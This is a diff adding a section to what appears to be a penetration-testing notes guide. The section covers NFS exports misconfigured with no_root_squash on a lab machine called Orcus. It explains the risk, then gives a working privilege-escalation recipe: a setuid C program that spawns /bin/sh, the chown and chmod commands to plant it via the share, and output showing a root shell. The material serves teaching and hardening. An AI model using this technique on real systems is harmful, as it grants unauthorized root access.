@@ -3241,6 +3241,55 @@ Now, let's try to mount /backup and to get the content
  $ ls backup
  backup.tar.bz2.zip
 
+This is implemented by /etc/exports
+
+::
+
+ www-data@Orcus:/$ cat /etc/exports
+ cat /etc/exports
+ # /etc/exports: the access control list for filesystems which may be exported
+ #              to NFS clients.  See exports(5).
+ #
+ # Example for NFSv2 and NFSv3:
+ # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+ #
+ # Example for NFSv4:
+ # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+ # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+ #
+ /tmp *(rw,no_root_squash)
+
+
+**Do Not Use the no_root_squash Option**
+
+By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set. If no_root_squash is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.
+
+
+**Note**: This is very dangerous if a) found on a linux box and b) you are unprivileged user on that linux box. Above we have mounted as read-only. However, we can mount as rw and copy a setuid program
+
+::
+
+ int main(void) {
+ setgid(0); setuid(0);
+ execl(“/bin/sh”,”sh”,0); }
+
+Compile it based on the architecture, give it setuid and executable permissions as root ( Remember, we mounted as root )
+
+::
+
+ chown root.root ./pwnme
+ chmod u+s ./pwnme
+
+Further, if we are unpriviledged user on that linux box, we can just execute this binary to become root.
+
+::
+
+ www-data@xxxxxhostcus:/tmp$ ./pwnme
+ ./pwnme
+ # id
+ id
+ uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
 
 ISCSI - Port 3260
 ------------------
